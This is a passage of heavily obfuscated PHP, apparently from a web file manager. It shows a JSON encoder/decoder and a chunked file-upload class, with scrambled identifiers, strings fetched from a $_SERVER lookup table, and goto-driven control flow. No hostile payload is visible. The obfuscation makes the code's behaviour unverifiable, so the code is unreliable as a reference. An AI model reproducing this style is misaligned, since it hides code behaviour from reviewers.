$FÍ×ğ¾äÔ[33])), $AÔÚòóÙÚ); return $AÔÚòóÙÚ; } public function getLastSql($cæã•Èíñä = '') { return $cæã•Èíñä ? $this->modelSql[$cæã•Èíñä] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($bĞ‡ÕƒÆø«) { return addslashes($bĞ‡ÕƒÆø«); } public function setModel($EÃã·Ç“) { $this->model = $EÃã·Ç“; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto A™ÛŸƒ…îâ; EƒàòÀæ: class Services_JSON { function __construct($BŠ„ìî¢ØÂ = 0) { $this->use = $BŠ„ìî¢ØÂ; } function utf162utf8($dìÁ×§¼å¼) { $Fî¡œï¸¬ =& $_SERVER[£ü]; if (function_exists($Fî¡œï¸¬[68])) { return mb_convert_encoding($dìÁ×§¼å¼, $Fî¡œï¸¬[1550], $Fî¡œï¸¬[1899]); } $bòÓ‚å£« = ord($dìÁ×§¼å¼[0]) << 8 | ord($dìÁ×§¼å¼[1]); switch (!0) { case (127 & $bòÓ‚å£«) == $bòÓ‚å£«: return chr(127 & $bòÓ‚å£«); case (2047 & $bòÓ‚å£«) == $bòÓ‚å£«: return chr(192 | $bòÓ‚å£« >> 6 & 31) . chr(128 | $bòÓ‚å£« & 63); case (65535 & $bòÓ‚å£«) == $bòÓ‚å£«: return chr(224 | $bòÓ‚å£« >> 12 & 15) . chr(128 | $bòÓ‚å£« >> 6 & 63) . chr(128 | $bòÓ‚å£« & 63); } return $Fî¡œï¸¬[33]; } function utf82utf16($c…êˆ‰™Ù—) { $e ÕƒÅÊÚ =& $_SERVER[£ü]; if (function_exists($e ÕƒÅÊÚ[68])) { return mb_convert_encoding($c…êˆ‰™Ù—, $e ÕƒÅÊÚ[1899], $e ÕƒÅÊÚ[1550]); } switch (strlen($c…êˆ‰™Ù—)) { case 1: return $c…êˆ‰™Ù—; case 2: return chr(7 & ord($c…êˆ‰™Ù—[0]) >> 2) . chr(192 & ord($c…êˆ‰™Ù—[0]) << 6 | 63 & ord($c…êˆ‰™Ù—[1])); case 3: return chr(240 & ord($c…êˆ‰™Ù—[0]) << 4 | 15 & ord($c…êˆ‰™Ù—[1]) >> 2) . chr(192 & ord($c…êˆ‰™Ù—[1]) << 6 | 127 & ord($c…êˆ‰™Ù—[2])); } return $e ÕƒÅÊÚ[33]; } function encode($FØ¥¿¹¤†) { $F›ä§àò¿ =& $_SERVER[£ü]; switch (gettype($FØ¥¿¹¤†)) { case $F›ä§àò¿[1561]: return $FØ¥¿¹¤† ? $F›ä§àò¿[1560] : $F›ä§àò¿[1562]; case $F›ä§àò¿[1900]: return $F›ä§àò¿[101]; case $F›ä§àò¿[300]: return (int) $FØ¥¿¹¤†; case $F›ä§àò¿[275]: case $F›ä§àò¿[274]: return (double) $FØ¥¿¹¤†; case $F›ä§àò¿[309]: $b•ã´Â¯¹Û = $F›ä§àò¿[33]; $Dà°Õ¦Şî÷ = strlen($FØ¥¿¹¤†); for ($D‰±“ĞàÖ‚ = 0; $D‰±“ĞàÖ‚ < $Dà°Õ¦Şî÷; ++$D‰±“ĞàÖ‚) { $Ešõš²¦äô = ord($FØ¥¿¹¤†[$D‰±“ĞàÖ‚]); switch (!0) { case $Ešõš²¦äô == 8: $b•ã´Â¯¹Û .= $F›ä§àò¿[1901]; break; case $Ešõš²¦äô == 9: $b•ã´Â¯¹Û .= $F›ä§àò¿[1537]; break; case $Ešõš²¦äô == 10: $b•ã´Â¯¹Û .= $F›ä§àò¿[1535]; break; case $Ešõš²¦äô == 12: $b•ã´Â¯¹Û .= $F›ä§àò¿[1902]; break; case $Ešõš²¦äô == 13: $b•ã´Â¯¹Û .= $F›ä§àò¿[1536]; break; case $Ešõš²¦äô == 34: case $Ešõš²¦äô == 47: case $Ešõš²¦äô == 92: $b•ã´Â¯¹Û .= $F›ä§àò¿[95] . $FØ¥¿¹¤†[$D‰±“ĞàÖ‚]; break; case $Ešõš²¦äô >= 32 && $Ešõš²¦äô <= 127: $b•ã´Â¯¹Û .= $FØ¥¿¹¤†[$D‰±“ĞàÖ‚]; break; case ($Ešõš²¦äô & 224) == 192: $C¡¶°Û¼®Ÿ = pack($F›ä§àò¿[1903], $Ešõš²¦äô, ord($FØ¥¿¹¤†[$D‰±“ĞàÖ‚ + 1])); $D‰±“ĞàÖ‚ += 1; $dÊêÙË¶ë¸ = $this->utf82utf16($C¡¶°Û¼®Ÿ); $b•ã´Â¯¹Û .= sprintf($F›ä§àò¿[1904], bin2hex($dÊêÙË¶ë¸)); break; case ($Ešõš²¦äô & 240) == 224: $C¡¶°Û¼®Ÿ = pack($F›ä§àò¿[1903], $Ešõš²¦äô, ord($FØ¥¿¹¤†[$D‰±“ĞàÖ‚ + 1]), ord($FØ¥¿¹¤†[$D‰±“ĞàÖ‚ + 2])); $D‰±“ĞàÖ‚ += 2; $dÊêÙË¶ë¸ = $this->utf82utf16($C¡¶°Û¼®Ÿ); $b•ã´Â¯¹Û .= sprintf($F›ä§àò¿[1904], bin2hex($dÊêÙË¶ë¸)); break; case ($Ešõš²¦äô & 248) == 240: $C¡¶°Û¼®Ÿ = pack($F›ä§àò¿[1903], $Ešõš²¦äô, ord($FØ¥¿¹¤†[$D‰±“ĞàÖ‚ + 1]), ord($FØ¥¿¹¤†[$D‰±“ĞàÖ‚ + 2]), ord($FØ¥¿¹¤†[$D‰±“ĞàÖ‚ + 3])); $D‰±“ĞàÖ‚ += 3; $dÊêÙË¶ë¸ = $this->utf82utf16($C¡¶°Û¼®Ÿ); $b•ã´Â¯¹Û .= sprintf($F›ä§àò¿[1904], bin2hex($dÊêÙË¶ë¸)); break; case ($Ešõš²¦äô & 252) == 248: $C¡¶°Û¼®Ÿ = pack($F›ä§àò¿[1903], $Ešõš²¦äô, ord($FØ¥¿¹¤†[$D‰±“ĞàÖ‚ + 1]), ord($FØ¥¿¹¤†[$D‰±“ĞàÖ‚ + 2]), ord($FØ¥¿¹¤†[$D‰±“ĞàÖ‚ + 3]), ord($FØ¥¿¹¤†[$D‰±“ĞàÖ‚ + 4])); $D‰±“ĞàÖ‚ += 4; $dÊêÙË¶ë¸ = $this->utf82utf16($C¡¶°Û¼®Ÿ); $b•ã´Â¯¹Û .= sprintf($F›ä§àò¿[1904], bin2hex($dÊêÙË¶ë¸)); break; case ($Ešõš²¦äô & 254) == 252: $C¡¶°Û¼®Ÿ = pack($F›ä§àò¿[1903], $Ešõš²¦äô, ord($FØ¥¿¹¤†[$D‰±“ĞàÖ‚ + 1]), ord($FØ¥¿¹¤†[$D‰±“ĞàÖ‚ + 2]), ord($FØ¥¿¹¤†[$D‰±“ĞàÖ‚ + 3]), ord($FØ¥¿¹¤†[$D‰±“ĞàÖ‚ + 4]), ord($FØ¥¿¹¤†[$D‰±“ĞàÖ‚ + 5])); $D‰±“ĞàÖ‚ += 5; $dÊêÙË¶ë¸ = $this->utf82utf16($C¡¶°Û¼®Ÿ); $b•ã´Â¯¹Û .= sprintf($F›ä§àò¿[1904], bin2hex($dÊêÙË¶ë¸)); break; } } return $F›ä§àò¿[113] . $b•ã´Â¯¹Û . $F›ä§àò¿[113]; case $F›ä§àò¿[1905]: if (is_array($FØ¥¿¹¤†) && count($FØ¥¿¹¤†) && array_keys($FØ¥¿¹¤†) !== range(0, sizeof($FØ¥¿¹¤†) - 1)) { $BÄŸŠª×ÅÍ = array_map(array($this, $F›ä§àò¿[1906]), array_keys($FØ¥¿¹¤†), array_values($FØ¥¿¹¤†)); foreach ($BÄŸŠª×ÅÍ as $f™ˆÁ) { if (Services_JSON::isError($f™ˆÁ)) { return $f™ˆÁ; } } return $F›ä§àò¿[1058] . join($F›ä§àò¿[47], $BÄŸŠª×ÅÍ) . $F›ä§àò¿[312]; } $Bù©ÜëÑğ = array_map(array($this, $F›ä§àò¿[1907]), $FØ¥¿¹¤†); foreach ($Bù©ÜëÑğ as $cÉ­©Ì°êë) { if (Services_JSON::isError($cÉ­©Ì°êë)) { return $cÉ­©Ì°êë; } } return $F›ä§àò¿[154] . join($F›ä§àò¿[47], $Bù©ÜëÑğ) . $F›ä§àò¿[472]; case $F›ä§àò¿[1908]: $c·É›¶åÃŠ = get_object_vars($FØ¥¿¹¤†); $BÄŸŠª×ÅÍ = array_map(array($this, $F›ä§àò¿[1906]), array_keys($c·É›¶åÃŠ), array_values($c·É›¶åÃŠ)); foreach ($BÄŸŠª×ÅÍ as $f™ˆÁ) { if (Services_JSON::isError($f™ˆÁ)) { return $f™ˆÁ; } } return $F›ä§àò¿[1058] . join($F›ä§àò¿[47], $BÄŸŠª×ÅÍ) . $F›ä§àò¿[312]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $F›ä§àò¿[101] : new Services_JSON_Error(gettype($FØ¥¿¹¤†) . $F›ä§àò¿[1909]); } } function name_value($aëèÆ’”«, $eÊ°¥‹óá´) { $c­™¿„Ş¿ñ = $this->encode($eÊ°¥‹óá´); if (Services_JSON::isError($c­™¿„Ş¿ñ)) { return $c­™¿„Ş¿ñ; } return $this->encode(strval($aëèÆ’”«)) . $_SERVER[£ü][4] . $c­™¿„Ş¿ñ; } function reduce_string($E­³Ï™›Ğ) { $e‰´ÇÉ¥¬ï =& $_SERVER[£ü]; $E­³Ï™›Ğ = preg_replace(array($e‰´ÇÉ¥¬ï[1910], $e‰´ÇÉ¥¬ï[1911], $e‰´ÇÉ¥¬ï[1912]), $e‰´ÇÉ¥¬ï[33], $E­³Ï™›Ğ); return trim($E­³Ï™›Ğ); } function decode($f’ÑÍñä“ğ) { $A¾„…õÖİ± =& $_SERVER[£ü]; $f’ÑÍñä“ğ = $this->reduce_string($f’ÑÍñä“ğ); switch (strtolower($f’ÑÍñä“ğ)) { case $A¾„…õÖİ±[1560]: return !0; case $A¾„…õÖİ±[1562]: return !1; case $A¾„…õÖİ±[101]: return null; default: $DÎš®™‹ä¨ = array(); if (is_numeric($f’ÑÍñä“ğ)) { return (double) $f’ÑÍñä“ğ == (int) $f’ÑÍñä“ğ ? (int) $f’ÑÍñä“ğ : (double) $f’ÑÍñä“ğ; } elseif (preg_match($A¾„…õÖİ±[1913], $f’ÑÍñä“ğ, $DÎš®™‹ä¨) && $DÎš®™‹ä¨[1] == $DÎš®™‹ä¨[2]) { $cÆ¦•‰õ¥İ = substr($f’ÑÍñä“ğ, 0, 1); $dŒ÷ñ·Å› = substr($f’ÑÍñä“ğ, 1, -1); $döƒ÷’—ç = $A¾„…õÖİ±[33]; $cßŸã´íŸ“ = strlen($dŒ÷ñ·Å›); for ($e°Ûéâ²“ = 0; $e°Ûéâ²“ < $cßŸã´íŸ“; ++$e°Ûéâ²“) { $BçÒê«Œù = substr($dŒ÷ñ·Å›, $e°Ûéâ²“, 2); $cø ’‰‚ = ord($dŒ÷ñ·Å›[$e°Ûéâ²“]); switch (!0) { case $BçÒê«Œù == $A¾„…õÖİ±[1901]: $döƒ÷’—ç .= chr(8); ++$e°Ûéâ²“; break; case $BçÒê«Œù == $A¾„…õÖİ±[1537]: $döƒ÷’—ç .= chr(9); ++$e°Ûéâ²“; break; case $BçÒê«Œù == $A¾„…õÖİ±[1535]: $döƒ÷’—ç .= chr(10); ++$e°Ûéâ²“; break; case $BçÒê«Œù == $A¾„…õÖİ±[1902]: $döƒ÷’—ç .= chr(12); ++$e°Ûéâ²“; break; case $BçÒê«Œù == $A¾„…õÖİ±[1536]: $döƒ÷’—ç .= chr(13); ++$e°Ûéâ²“; break; case $BçÒê«Œù == $A¾„…õÖİ±[1321]: case $BçÒê«Œù == $A¾„…õÖİ±[1914]: case $BçÒê«Œù == $A¾„…õÖİ±[1530]: case $BçÒê«Œù == $A¾„…õÖİ±[1532]: if ($cÆ¦•‰õ¥İ == $A¾„…õÖİ±[113] && $BçÒê«Œù != $A¾„…õÖİ±[1914] || $cÆ¦•‰õ¥İ == $A¾„…õÖİ±[55] && $BçÒê«Œù != $A¾„…õÖİ±[1321]) { $döƒ÷’—ç .= $dŒ÷ñ·Å›[++$e°Ûéâ²“]; } break; case preg_match($A¾„…õÖİ±[1915], substr($dŒ÷ñ·Å›, $e°Ûéâ²“, 6)): $b°×šÅñ¢Ö = chr(hexdec(substr($dŒ÷ñ·Å›, $e°Ûéâ²“ + 2, 2))) . chr(hexdec(substr($dŒ÷ñ·Å›, $e°Ûéâ²“ + 4, 2))); $döƒ÷’—ç .= $this->utf162utf8($b°×šÅñ¢Ö); $e°Ûéâ²“ += 5; break; case $cø ’‰‚ >= 32 && $cø ’‰‚ <= 127: $döƒ÷’—ç .= $dŒ÷ñ·Å›[$e°Ûéâ²“]; break; case ($cø ’‰‚ & 224) == 192: $döƒ÷’—ç .= substr($dŒ÷ñ·Å›, $e°Ûéâ²“, 2); ++$e°Ûéâ²“; break; case ($cø ’‰‚ & 240) == 224: $döƒ÷’—ç .= substr($dŒ÷ñ·Å›, $e°Ûéâ²“, 3); $e°Ûéâ²“ += 2; break; case ($cø ’‰‚ & 248) == 240: $döƒ÷’—ç .= substr($dŒ÷ñ·Å›, $e°Ûéâ²“, 4); $e°Ûéâ²“ += 3; break; case ($cø ’‰‚ & 252) == 248: $döƒ÷’—ç .= substr($dŒ÷ñ·Å›, $e°Ûéâ²“, 5); $e°Ûéâ²“ += 4; break; case ($cø ’‰‚ & 254) == 252: $döƒ÷’—ç .= substr($dŒ÷ñ·Å›, $e°Ûéâ²“, 6); $e°Ûéâ²“ += 5; break; } } return $döƒ÷’—ç; } elseif (preg_match($A¾„…õÖİ±[1916], $f’ÑÍñä“ğ) || preg_match($A¾„…õÖİ±[1917], $f’ÑÍñä“ğ)) { goto CİäÚ¯™; CİäÚ¯™: if ($f’ÑÍñä“ğ[0] == $A¾„…õÖİ±[154]) { $E§¨Ò¥Ó÷Í = array(SERVICES_JSON_IN_ARR); $b¡¥ÅàÏâ„ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $E§¨Ò¥Ó÷Í = array(SERVICES_JSON_IN_OBJ); $E‹ß”‡æ® = array(); } else { $E§¨Ò¥Ó÷Í = array(SERVICES_JSON_IN_OBJ); $E‹ß”‡æ® = new stdClass(); } } array_push($E§¨Ò¥Ó÷Í, array($A¾„…õÖİ±[1918] => SERVICES_JSON_SLICE, $A¾„…õÖİ±[260] => 0, $A¾„…õÖİ±[1919] => !1)); $dŒ÷ñ·Å› = substr($f’ÑÍñä“ğ, 1, -1); goto B¢å¡¿Ÿ²; B¢å¡¿Ÿ²: $dŒ÷ñ·Å› = $this->reduce_string($dŒ÷ñ·Å›); if ($dŒ÷ñ·Å› == $A¾„…õÖİ±[33]) { if (reset($E§¨Ò¥Ó÷Í) == SERVICES_JSON_IN_ARR) { return $b¡¥ÅàÏâ„; } else { return $E‹ß”‡æ®; } } $cßŸã´íŸ“ = strlen($dŒ÷ñ·Å›); goto a’…ÒÂ¹ÓÖ; a’…ÒÂ¹ÓÖ: for ($e°Ûéâ²“ = 0; $e°Ûéâ²“ <= $cßŸã´íŸ“; ++$e°Ûéâ²“) { $d©†ãŒœ‹‡ = end($E§¨Ò¥Ó÷Í); $BçÒê«Œù = substr($dŒ÷ñ·Å›, $e°Ûéâ²“, 2); if ($e°Ûéâ²“ == $cßŸã´íŸ“ || $dŒ÷ñ·Å›[$e°Ûéâ²“] == $A¾„…õÖİ±[47] && $d©†ãŒœ‹‡[$A¾„…õÖİ±[1918]] == SERVICES_JSON_SLICE) { $F°ºŒ´ªŒ‚ = substr($dŒ÷ñ·Å›, $d©†ãŒœ‹‡[$A¾„…õÖİ±[260]], $e°Ûéâ²“ - $d©†ãŒœ‹‡[$A¾„…õÖİ±[260]]); array_push($E§¨Ò¥Ó÷Í, array($A¾„…õÖİ±[1918] => SERVICES_JSON_SLICE, $A¾„…õÖİ±[260] => $e°Ûéâ²“ + 1, $A¾„…õÖİ±[1919] => !1)); if (reset($E§¨Ò¥Ó÷Í) == SERVICES_JSON_IN_ARR) { array_push($b¡¥ÅàÏâ„, $this->decode($F°ºŒ´ªŒ‚)); } elseif (reset($E§¨Ò¥Ó÷Í) == SERVICES_JSON_IN_OBJ) { $bêç‰Ä÷ç› = array(); if (preg_match($A¾„…õÖİ±[1920], $F°ºŒ´ªŒ‚, $bêç‰Ä÷ç›)) { $B·ÕĞÖËØ = $this->decode($bêç‰Ä÷ç›[1]); $f©“ÈÎ¦º = $this->decode($bêç‰Ä÷ç›[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $E‹ß”‡æ®[$B·ÕĞÖËØ] = $f©“ÈÎ¦º; } else { $E‹ß”‡æ®->{$B·ÕĞÖËØ} = $f©“ÈÎ¦º; } } elseif (preg_match($A¾„…õÖİ±[1921], $F°ºŒ´ªŒ‚, $bêç‰Ä÷ç›)) { $B·ÕĞÖËØ = $bêç‰Ä÷ç›[1]; $f©“ÈÎ¦º = $this->decode($bêç‰Ä÷ç›[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $E‹ß”‡æ®[$B·ÕĞÖËØ] = $f©“ÈÎ¦º; } else { $E‹ß”‡æ®->{$B·ÕĞÖËØ} = $f©“ÈÎ¦º; } } } } elseif (($dŒ÷ñ·Å›[$e°Ûéâ²“] == $A¾„…õÖİ±[113] || $dŒ÷ñ·Å›[$e°Ûéâ²“] == $A¾„…õÖİ±[55]) && $d©†ãŒœ‹‡[$A¾„…õÖİ±[1918]] != SERVICES_JSON_IN_STR) { array_push($E§¨Ò¥Ó÷Í, array($A¾„…õÖİ±[1918] => SERVICES_JSON_IN_STR, $A¾„…õÖİ±[260] => $e°Ûéâ²“, $A¾„…õÖİ±[1919] => $dŒ÷ñ·Å›[$e°Ûéâ²“])); } elseif ($dŒ÷ñ·Å›[$e°Ûéâ²“] == $d©†ãŒœ‹‡[$A¾„…õÖİ±[1919]] && $d©†ãŒœ‹‡[$A¾„…õÖİ±[1918]] == SERVICES_JSON_IN_STR && (strlen(substr($dŒ÷ñ·Å›, 0, $e°Ûéâ²“)) - strlen(rtrim(substr($dŒ÷ñ·Å›, 0, $e°Ûéâ²“), $A¾„…õÖİ±[95]))) % 2 != 1) { array_pop($E§¨Ò¥Ó÷Í); } elseif ($dŒ÷ñ·Å›[$e°Ûéâ²“] == $A¾„…õÖİ±[154] && in_array($d©†ãŒœ‹‡[$A¾„…õÖİ±[1918]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($E§¨Ò¥Ó÷Í, array($A¾„…õÖİ±[1918] => SERVICES_JSON_IN_ARR, $A¾„…õÖİ±[260] => $e°Ûéâ²“, $A¾„…õÖİ±[1919] => !1)); } elseif ($dŒ÷ñ·Å›[$e°Ûéâ²“] == $A¾„…õÖİ±[472] && $d©†ãŒœ‹‡[$A¾„…õÖİ±[1918]] == SERVICES_JSON_IN_ARR) { array_pop($E§¨Ò¥Ó÷Í); } elseif ($dŒ÷ñ·Å›[$e°Ûéâ²“] == $A¾„…õÖİ±[1058] && in_array($d©†ãŒœ‹‡[$A¾„…õÖİ±[1918]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($E§¨Ò¥Ó÷Í, array($A¾„…õÖİ±[1918] => SERVICES_JSON_IN_OBJ, $A¾„…õÖİ±[260] => $e°Ûéâ²“, $A¾„…õÖİ±[1919] => !1)); } elseif ($dŒ÷ñ·Å›[$e°Ûéâ²“] == $A¾„…õÖİ±[312] && $d©†ãŒœ‹‡[$A¾„…õÖİ±[1918]] == SERVICES_JSON_IN_OBJ) { array_pop($E§¨Ò¥Ó÷Í); } elseif ($BçÒê«Œù == $A¾„…õÖİ±[1922] && in_array($d©†ãŒœ‹‡[$A¾„…õÖİ±[1918]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($E§¨Ò¥Ó÷Í, array($A¾„…õÖİ±[1918] => SERVICES_JSON_IN_CMT, $A¾„…õÖİ±[260] => $e°Ûéâ²“, $A¾„…õÖİ±[1919] => !1)); $e°Ûéâ²“++; } elseif ($BçÒê«Œù == $A¾„…õÖİ±[1923] && $d©†ãŒœ‹‡[$A¾„…õÖİ±[1918]] == SERVICES_JSON_IN_CMT) { array_pop($E§¨Ò¥Ó÷Í); $e°Ûéâ²“++; for ($BŒÒøĞñ = $d©†ãŒœ‹‡[$A¾„…õÖİ±[260]]; $BŒÒøĞñ <= $e°Ûéâ²“; ++$BŒÒøĞñ) { $dŒ÷ñ·Å› = substr_replace($dŒ÷ñ·Å›, $A¾„…õÖİ±[50], $BŒÒøĞñ, 1); } } } if (reset($E§¨Ò¥Ó÷Í) == SERVICES_JSON_IN_ARR) { return $b¡¥ÅàÏâ„; } elseif (reset($E§¨Ò¥Ó÷Í) == SERVICES_JSON_IN_OBJ) { return $E‹ß”‡æ®; } goto dù÷¥¥‘ø; dù÷¥¥‘ø: } } } function isError($e±˜Ìï¬Ÿæ, $e¯†ÅÑ¹½¿ = null) { $Cù¢ãİÎí =& $_SERVER[£ü]; if (class_exists($Cù¢ãİÎí[1924])) { return PEAR::isError($e±˜Ìï¬Ÿæ, $e¯†ÅÑ¹½¿); } elseif (is_object($e±˜Ìï¬Ÿæ) && (get_class($e±˜Ìï¬Ÿæ) == $Cù¢ãİÎí[1925] || is_subclass_of($e±˜Ìï¬Ÿæ, $Cù¢ãİÎí[1925]))) { return !0; } return !1; } } if (class_exists($_SERVER[£ü][1926])) { class Services_JSON_Error extends PEAR_Error { function __construct($EÆ‚ÎØÔù» = "\165\156\153\156\x6f\167\156\x20\x65\162\x72\x6f\x72", $díÌÂÎ›ƒ = null, $A¤è™‡„œÍ = null, $f³„Á¸á = null, $E¤²‘£ÕÁÆ = null) { parent::PEAR_Error($EÆ‚ÎØÔù», $díÌÂÎ›ƒ, $A¤è™‡„œÍ, $f³„Á¸á, $E¤²‘£ÕÁÆ); } } } else { class Services_JSON_Error { function __construct($dÇõ­å°Œ’ = "\165\156\x6b\x6e\x6f\167\156\x20\x65\162\x72\157\x72", $dö›Ş‡ÆòĞ = null, $B¯èÔ¢ó»ƒ = null, $BÏÃÇ–Ş÷ = null, $BâÈš¶Ç×á = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto cáŠÔÎ¢È–; aÅ¬¥ßÌµÌ: if (!empty($_FILES)) { $CåÛ‹äˆê® = $_FILES[$AËÈ³©°¯[164]]; $this->uploadFile = $CåÛ‹äˆê®[$AËÈ³©°¯[1927]]; if (!$this->uploadFile && $CåÛ‹äˆê®[$AËÈ³©°¯[1201]] > 0) { show_json($this->errorInfo($CåÛ‹äˆê®[$AËÈ³©°¯[1201]]), !1); } } else { if (isset($in[$AËÈ³©°¯[383]])) { $this->uploadFile = isset($in[$AËÈ³©°¯[1928]]) ? $AËÈ³©°¯[1929] : $AËÈ³©°¯[1774]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto cë›´ĞÅ­Ë; cë›´ĞÅ­Ë: $this->checkSize(); $this->tempPathInit(); goto C¨Èé‘ÎÖ; cáŠÔÎ¢È–: $AËÈ³©°¯ =& $_SERVER[£ü]; global $in; $this->in =& $in; goto aÅ¬¥ßÌµÌ; C¨Èé‘ÎÖ: } public function upload() { goto B²¸…“›Ò¤; BôĞéğÇµ : CacheLock::lock($this->tempFile, 20); $e‹Íø»¤† = $this->statusGet(); $this->initFileTemp(); goto c›áˆï»×ö; AÓÏíÆ’ê: @unlink($C˜°ÀÊÊæ); if (!$f ·¹®ÖëÌ) { $this->showJson($Eˆë³Àè©[1938] . $b‡ï¼“¸ò, !1); } $e‹Íø»¤†[$Eˆë³Àè©[1939]] = $AĞ†ì¤Ğ; goto bšËÆ†„‹; bšËÆ†„‹: $e‹Íø»¤†[$Eˆë³Àè©[1940]][$Eˆë³Àè©[1941] . $b‡ï¼“¸ò] = array($Eˆë³Àè©[1942] => $E¦îä•ğ¨È, $Eˆë³Àè©[1026] => $b‡ï¼“¸ò, $Eˆë³Àè©[77] => $CÂŠŠ¦¨É², $Eˆë³Àè©[161] => $A÷¶„÷Ò¾ˆ); $this->statusSet($e‹Íø»¤†); if (count($e‹Íø»¤†[$Eˆë³Àè©[1940]]) != $e‹Íø»¤†[$Eˆë³Àè©[1939]]) { $this->showJson($Eˆë³Àè©[1943] . $b‡ï¼“¸ò, !0); } goto A†Õ›‰…; F°Ó¥²ä˜»: $F£¼·»ÍŒ¥ = $this->tempFile . $Eˆë³Àè©[1932] . $b‡ï¼“¸ò; $CÂŠŠ¦¨É² = isset($this->in[$Eˆë³Àè©[516]]) ? intval($this->in[$Eˆë³Àè©[516]]) : 0; $F¼šÔÕ›™ = isset($this->in[$Eˆë³Àè©[1933]]) ? intval($this->in[$Eˆë³Àè©[1933]]) : 0; goto BÛÁµ’Äøµ; BÛÁµ’Äøµ: if ($AĞ†ì¤Ğ > 1 && $F¼šÔÕ›™ <= 0) { show_json($Eˆë³Àè©[1934], !1); } if ($F¼šÔÕ›™ > $CÂŠŠ¦¨É²) { $AĞ†ì¤Ğ = 1; } if ($AĞ†ì¤Ğ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto BôĞéğÇµ ; aà ï‰øó: $E¦îä•ğ¨È = $b‡ï¼“¸ò * $F¼šÔÕ›™; $f†•´å˜á = @fopen($this->tempFile, $Eˆë³Àè©[1937]); fseek($f†•´å˜á, $E¦îä•ğ¨È); goto Fôí÷ƒëÎ½; A†Õ›‰…: ignore_timeout(); if (!$this->checkChunkHash($e‹Íø»¤†)) { $this->showJson($Eˆë³Àè©[1944], !1); } $this->statusSet(!1); goto d¦¡‰÷ºã; c›áˆï»×ö: $C˜°ÀÊÊæ = $this->moveUploadedFile($F£¼·»ÍŒ¥); if ($CÂŠŠ¦¨É² > 0 && filesize($C˜°ÀÊÊæ) == 0) { $this->showJson($Eˆë³Àè©[1935], !1); } if (!$C˜°ÀÊÊæ) { $this->showJson(LNG($Eˆë³Àè©[1936]), !1); } goto aà ï‰øó; Fôí÷ƒëÎ½: $f ·¹®ÖëÌ = $this->writeTo($C˜°ÀÊÊæ, $f†•´å˜á, $this->tempFile); $A÷¶„÷Ò¾ˆ = IO::hashSimple($C˜°ÀÊÊæ); $CÂŠŠ¦¨É² = IO::size($C˜°ÀÊÊæ); goto AÓÏíÆ’ê; B²¸…“›Ò¤: $Eˆë³Àè© =& $_SERVER[£ü]; $b‡ï¼“¸ò = isset($this->in[$Eˆë³Àè©[1930]]) ? intval($this->in[$Eˆë³Àè©[1930]]) : 0; $AĞ†ì¤Ğ = isset($this->in[$Eˆë³Àè©[1931]]) ? intval($this->in[$Eˆë³Àè©[1931]]) : 1; goto F°Ó¥²ä˜»; d¦¡‰÷ºã: CacheLock::unlock($this->tempFile); return $this->tempFile; goto f œéœ³; f œéœ³: } private function checkSize() { $EÊ¼ë¥¶ã­ =& $_SERVER[£ü]; if (phpBuild64() || $this->in[$EÊ¼ë¥¶ã­[77]] < PHP_INT_MAX) { return; } show_json(LNG($EÊ¼ë¥¶ã­[1945]), !1); } private function showJson($bÄ‡Áøæïã, $føÍ £‡—) { CacheLock::unlock($this->tempFile); if (!$føÍ £‡—) { return show_json($bÄ‡Áøæïã, $føÍ £‡—); } show_json($bÄ‡Áøæïã, $føÍ £‡—); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto f÷Ñ¹¼¶Á‹; F¶õÛß†‡Û: touch($aÉ„ƒšÍ§õ . $dÌËğºÜ˜é[1946]); $DÛ ©×¥ï = isset($this->in[$dÌËğºÜ˜é[1947]]) ? $this->in[$dÌËğºÜ˜é[1947]] : !1; if (strlen($DÛ ©×¥ï) < 30) { $DÛ ©×¥ï = md5(USER_ID . $this->in[$dÌËğºÜ˜é[75]] . $this->fileName . $this->in[$dÌËğºÜ˜é[77]]); } goto B•ïÅƒÙ‚; f÷Ñ¹¼¶Á‹: $dÌËğºÜ˜é =& $_SERVER[£ü]; $aÉ„ƒšÍ§õ = TEMP_FILES; @mk_dir($aÉ„ƒšÍ§õ); goto F¶õÛß†‡Û; B•ïÅƒÙ‚: $this->tempFile = $aÉ„ƒšÍ§õ . $dÌËğºÜ˜é[1948] . md5($DÛ ©×¥ï . $this->in[$dÌËğºÜ˜é[1492]]); goto BÀğÆ‡Ò¯; BÀğÆ‡Ò¯: } private function moveUploadedFile($dÙ›¿İˆ‚İ) { $Føñ¤¥¥™¥ =& $_SERVER[£ü]; $d¾Œí‚ëÙ = $this->uploadFile; if ($d¾Œí‚ëÙ == $Føñ¤¥¥™¥[1949]) { @file_put_contents($dÙ›¿İˆ‚İ, base64_decode($_REQUEST[$Føñ¤¥¥™¥[1950]])); } else { if ($d¾Œí‚ëÙ == $Føñ¤¥¥™¥[1774]) { $FãÊ°ã“‚ù = @fopen($dÙ›¿İˆ‚İ, $Føñ¤¥¥™¥[1481]); $this->writeTo($d¾Œí‚ëÙ, $FãÊ°ã“‚ù, $dÙ›¿İˆ‚İ); } else { if (!move_uploaded_file($d¾Œí‚ëÙ, $dÙ›¿İˆ‚İ)) { return !1; } } } return $dÙ›¿İˆ‚İ; } private function writeTo($CË÷ŠÏŒ«×, $D¢ê¨¤„, $bËÕÃÇ‡Õé) { goto fÜÆí’· Á; C ÈÅ°ò¹: $déã¬è ÏÖ = @fopen($CË÷ŠÏŒ«×, $Aá…«âƒ‚Ê[1480]); if (!$déã¬è ÏÖ || !$D¢ê¨¤„ || !$F‚ŞÇÉÆÀš) { CacheLock::unlock($føôèÖÕˆß); return !1; } while 